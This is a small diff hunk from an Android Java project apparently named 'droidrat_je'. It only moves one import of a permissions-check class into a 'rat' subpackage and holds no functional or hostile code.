@@ -14,7 +14,7 @@ import android.widget.ImageView;
 import androidx.appcompat.app.AppCompatActivity;
 
 import com.je_chen.droidrat_je.R;
-import com.je_chen.droidrat_je.modules.appsinfo.checkpermission.PermissionsCheck;
+import com.je_chen.droidrat_je.rat.modules.appsinfo.checkpermission.PermissionsCheck;
 import com.je_chen.droidrat_je.service.command.ProcessCommandService;
 
 import java.util.ArrayList;
